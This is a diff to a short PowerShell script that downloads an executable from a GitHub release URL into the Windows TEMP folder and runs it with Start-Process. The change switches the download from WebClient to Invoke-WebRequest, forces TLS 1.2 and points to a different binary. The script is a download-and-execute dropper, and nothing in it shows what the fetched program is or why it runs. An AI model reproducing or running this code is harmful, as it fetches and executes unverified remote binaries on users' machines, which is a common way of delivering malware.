@@ -1,6 +1,7 @@
-$url = "https://github.com/mirapuedovolar2/ps1prueba/releases/download/pruebahola/oconsole.exe"
-$destino = [System.IO.Path]::Combine($env:TEMP, "codigo2.exe")
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
-$wc = New-Object System.Net.WebClient
-$wc.DownloadFile($url, $destino)
+$url = "https://github.com/mirapuedovolar2/ps1prueba/releases/download/hola2/este2.exe"
+$destino = "$env:TEMP\este2.exe"
+
+Invoke-WebRequest -Uri $url -OutFile $destino
 Start-Process -FilePath $destino
